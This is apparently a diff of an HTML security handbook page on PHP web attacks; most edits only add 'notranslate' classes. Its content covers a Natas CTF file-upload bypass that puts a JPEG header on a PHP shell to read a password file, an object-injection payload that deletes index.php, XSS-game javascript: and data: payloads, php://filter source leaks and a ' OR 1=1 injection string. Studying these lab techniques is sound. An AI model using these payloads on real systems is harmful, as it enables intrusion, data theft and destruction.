@@ -234,8 +234,8 @@
 <p>The <a class="reference external" href="https://www.owasp.org/">OWASP</a> article is <a class="reference external" href="https://www.owasp.org/index.php/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a>, especially the section “Weak Protection Methods and Methods of Bypassing”. Read “Using Black-List for Files’ Extensions”, “Using White-List for Files’ Extensions”, “Using “Content-Type” from the Header”, and “Using a File Type Recogniser”.</p>
 <p>For “Using a File Type Recogniser” we provide one concrete example for their first method: “Sometimes the recognisers just read the few first characters (or header) of the files in order to check them. In this case, an attacker can insert the malicious code after some valid header.” Specifically, we’ll use the <a class="reference external" href="https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure">JPEG File Interchange Format</a> <a class="reference external" href="https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure">File format structure</a> to place 11 bytes at the beginning of a PHP file to indicate it is a JPEG file:</p>
 <blockquote>
-<div><p>The challenge <a class="reference external" href="http://overthewire.org/wargames/natas/">OverTheWire Natas</a> teaches the basics of serverside web security. <a class="reference external" href="http://natas13.natas.labs.overthewire.org/">Natas Level 13 -&gt; 14</a> (user id nata13, password “jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY”) is backed by a server-side script using <code class="docutils literal"><span class="pre">exif_imagetype</span></code> check to make sure the uploaded file is an image file. Here we bypass the image type check by setting the first 11 bytes of the PHP file to the JFIF header values, tricking the server into uploading php that displays the contents of the file <code class="file docutils literal"><span class="pre">/etc/natas_webpass/natas14</span></code> (password for the next Natas level). The php exploit code is:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + &quot;JFIF&quot; + \x00</span>
+<div><p>The challenge <a class="reference external" href="http://overthewire.org/wargames/natas/">OverTheWire Natas</a> teaches the basics of serverside web security. <a class="reference external" href="http://natas13.natas.labs.overthewire.org/">Natas Level 13 -&gt; 14</a> (user id nata13, password “jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY”) is backed by a server-side script using <code class="docutils literal notranslate"><span class="pre">exif_imagetype</span></code> check to make sure the uploaded file is an image file. Here we bypass the image type check by setting the first 11 bytes of the PHP file to the JFIF header values, tricking the server into uploading php that displays the contents of the file <code class="file docutils literal notranslate"><span class="pre">/etc/natas_webpass/natas14</span></code> (password for the next Natas level). The php exploit code is:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + &quot;JFIF&quot; + \x00</span>
 </span><span class="hll"><span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
 </span><span class="hll"><span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;echo -n PASS; cat /etc/natas_webpass/natas14&quot;); ?&gt;&#39;</span>
 </span><span class="hll"><span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; natas14.php
@@ -258,7 +258,7 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 </pre></div>
 </div>
 <p>Running this gives the Natas 14 password:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$ #</span> JPEG leading <span class="m">11</span> bytes: <span class="se">\x</span>FF + SOI + <span class="se">\x</span>FF + APP0 + <span class="se">\x</span><span class="m">00</span> + <span class="se">\x</span><span class="m">10</span> + <span class="s2">&quot;JFIF&quot;</span> + <span class="se">\x</span><span class="m">00</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$ #</span> JPEG leading <span class="m">11</span> bytes: <span class="se">\x</span>FF + SOI + <span class="se">\x</span>FF + APP0 + <span class="se">\x</span><span class="m">00</span> + <span class="se">\x</span><span class="m">10</span> + <span class="s2">&quot;JFIF&quot;</span> + <span class="se">\x</span><span class="m">00</span>
 </span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
 </span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;echo -n PASS; cat /etc/natas_webpass/natas14&quot;); ?&gt;&#39;</span>
 </span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; natas14.php
@@ -296,7 +296,7 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 </ul>
 </div></blockquote>
 <p>We’ll provide a little bit more detail on OWASP’s Example 1. __destruct() is one of PHP’s <a class="reference external" href="http://php.net/manual/en/language.oop5.magic.php">Magic Methods</a>. The idea is there’s a PHP class Example1 that gets unserialized (after presumably being serialized). It contains a __destruct() function that deletes the object’s cache file. The exploit tampers with a saved Example1 serialization to change the file to an arbitrary file, causing that file to be deleted:</p>
-<div class="highlight-php5"><div class="highlight"><pre><span></span><span class="x">class Example1</span>
+<div class="highlight-php5 notranslate"><div class="highlight"><pre><span></span><span class="x">class Example1</span>
 <span class="x">{</span>
 <span class="hll"><span class="x">   public $cache_file;</span>
 </span>
@@ -319,8 +319,8 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 <span class="x">// some PHP code...</span>
 </pre></div>
 </div>
-<p>The object Example1 deletes it’s $cache_file upon destruction and the exploiter wants instead to delete a PHP file. All they need do is create a serialized Example1 where $cache_file is set to a reference to the PHP file to be deleted (say <code class="file docutils literal"><span class="pre">../../index.php</span></code> to make the <code class="file docutils literal"><span class="pre">/var/www/cache/tmp/$file</span></code> reference delete <code class="file docutils literal"><span class="pre">/var/www/index.php</span></code>). This is done with a short PHP script declaring a class Example1, modifying the $cache_file variable as needed, then getting the serialized value (to be used later as input to a vulnerable PHP script):</p>
-<div class="highlight-php5"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<p>The object Example1 deletes it’s $cache_file upon destruction and the exploiter wants instead to delete a PHP file. All they need do is create a serialized Example1 where $cache_file is set to a reference to the PHP file to be deleted (say <code class="file docutils literal notranslate"><span class="pre">../../index.php</span></code> to make the <code class="file docutils literal notranslate"><span class="pre">/var/www/cache/tmp/$file</span></code> reference delete <code class="file docutils literal notranslate"><span class="pre">/var/www/index.php</span></code>). This is done with a short PHP script declaring a class Example1, modifying the $cache_file variable as needed, then getting the serialized value (to be used later as input to a vulnerable PHP script):</p>
+<div class="highlight-php5 notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
 <span class="hll"><span class="k">class</span> <span class="nc">Example1</span>
 </span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$cache_file</span><span class="p">;</span>
@@ -343,8 +343,8 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 </span><span class="cp">?&gt;</span><span class="x"></span>
 </pre></div>
 </div>
-<p>Running this gives the serialized output <code class="docutils literal"><span class="pre">O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}</span></code>. So then the following URL will cause <code class="file docutils literal"><span class="pre">index.php</span></code> to be deleted when the unserialized data object is destroyed:</p>
-<div class="highlight-text"><div class="highlight"><pre><span></span><span class="hll">http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}
+<p>Running this gives the serialized output <code class="docutils literal notranslate"><span class="pre">O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}</span></code>. So then the following URL will cause <code class="file docutils literal notranslate"><span class="pre">index.php</span></code> to be deleted when the unserialized data object is destroyed:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span class="hll">http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}
 </span></pre></div>
 </div>
 </div>
@@ -354,7 +354,7 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 <p><a class="reference external" href="http://in.php.net/wrappers.php">Supported Protocols and Wrappers</a> currently lists: <a class="reference external" href="file://">file://</a>, <a class="reference external" href="http://">http://</a>, <a class="reference external" href="ftp://">ftp://</a>, php://, zlib://, data://, glob://, phar://, ssh2://, rar://, ogg://, and expect://. Not all these are supported by all PHP servers, but the most important 2 for us are data:// and php://.</p>
 <div class="section" id="data">
 <h3>8.15.4.1. <a class="reference external" href="data://">data://</a><a class="headerlink" href="#data" title="Permalink to this headline">¶</a></h3>
-<p>The PHP protocols are similar to <a class="reference external" href="https://en.wikipedia.org/wiki/Data_URI_scheme">Data URI scheme</a>. There, Google’s <a class="reference external" href="https://xss-game.appspot.com/">XSS game</a> (solutions at <a class="reference internal" href="../challenges/googles_xss_game.html#xssgame"><span class="std std-ref">Google’s XSS Game</span></a>) level 6 can be solved using <a class="reference external" href="https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(&quot;boo&quot;)">https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(“boo”)</a>. Instead of loading a JavaScript file from some remote location, <code class="docutils literal"><span class="pre">data:text/javascript,...</span></code> supplies the data. Level 5 can be solved via <code class="docutils literal"><span class="pre">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&quot;boo&quot;)</span></code>, again using <code class="docutils literal"><span class="pre">javascript:alert(&quot;boo&quot;)</span></code> to specify the JavaScript directly instead of a file.</p>
+<p>The PHP protocols are similar to <a class="reference external" href="https://en.wikipedia.org/wiki/Data_URI_scheme">Data URI scheme</a>. There, Google’s <a class="reference external" href="https://xss-game.appspot.com/">XSS game</a> (solutions at <a class="reference internal" href="../challenges/googles_xss_game.html#xssgame"><span class="std std-ref">Google’s XSS Game</span></a>) level 6 can be solved using <a class="reference external" href="https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(&quot;boo&quot;)">https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(“boo”)</a>. Instead of loading a JavaScript file from some remote location, <code class="docutils literal notranslate"><span class="pre">data:text/javascript,...</span></code> supplies the data. Level 5 can be solved via <code class="docutils literal notranslate"><span class="pre">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&quot;boo&quot;)</span></code>, again using <code class="docutils literal notranslate"><span class="pre">javascript:alert(&quot;boo&quot;)</span></code> to specify the JavaScript directly instead of a file.</p>
 </div>
 <div class="section" id="php">
 <h3>8.15.4.2. php://<a class="headerlink" href="#php" title="Permalink to this headline">¶</a></h3>
@@ -363,11 +363,11 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 <div class="section" id="php-filter">
 <h3>8.15.4.3. php://filter<a class="headerlink" href="#php-filter" title="Permalink to this headline">¶</a></h3>
 <p>php://filter permits the application of a filter to a stream. The <a class="reference external" href="http://in.php.net/manual/en/filters.php">List of Available Filters</a> includes <a class="reference external" href="http://in.php.net/manual/en/filters.string.php">String Filters</a> (see <a class="reference external" href="http://in.php.net/manual/en/ref.strings.php">String Functions</a>), <a class="reference external" href="http://in.php.net/manual/en/filters.convert.php">Conversion Filters</a> (most importantly base64_encode() and base64_decode()), <a class="reference external" href="http://in.php.net/manual/en/filters.compression.php">Compression Filters</a>, and <a class="reference external" href="http://in.php.net/manual/en/filters.encryption.php">Encryption Filters</a>. A sequence of filters can be piped together using “|”:</p>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="hll"><span class="x">readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;);</span>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="x">readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;);</span>
 </span></pre></div>
 </div>
 <p>Challenge <a class="reference internal" href="../challenges/owlnest.html#owlnest"><span class="std std-ref">OwlNest</span></a> uses php://filter to download instead of execute PHP files by converting them to base64 (making them not PHP source):</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
 <span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 
@@ -383,8 +383,8 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 </div>
 <div class="section" id="php-fd">
 <h3>8.15.4.4. php://fd<a class="headerlink" href="#php-fd" title="Permalink to this headline">¶</a></h3>
-<p>php://fd allows direct access to a file descriptor like php://fd/9, though sometimes it will have to be referenced via <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code>. Challenge <a class="reference internal" href="../challenges/kioptrix4.html#kioptrix4"><span class="std std-ref">Kioptrix Level 4</span></a> uses <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> which is mapped to the PHP session data:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
+<p>php://fd allows direct access to a file descriptor like php://fd/9, though sometimes it will have to be referenced via <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code>. Challenge <a class="reference internal" href="../challenges/kioptrix4.html#kioptrix4"><span class="std std-ref">Kioptrix Level 4</span></a> uses <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code> which is mapped to the PHP session data:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span> on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
 <span class="hll"><span class="gp">john@Kioptrix4:/var/lib/php5$</span> sudo cat sess_e67efa732b9b15b6def9824e1200db76
 </span><span class="hll"><span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:12:&quot;&#39; OR 1=1-- -&quot;;</span>
 </span>
@@ -397,7 +397,7 @@ tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</s
 </span><span class="hll"><span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:12:&quot;&#39; OR 1=1-- -&quot;;</span>
 </span></pre></div>
 </div>
-<p>So kioptrix4 uses <code class="file docutils literal"><span class="pre">fd/9</span></code> to access the PHP session data.</p>
+<p>So kioptrix4 uses <code class="file docutils literal notranslate"><span class="pre">fd/9</span></code> to access the PHP session data.</p>
 </div>
 </div>
 </div>
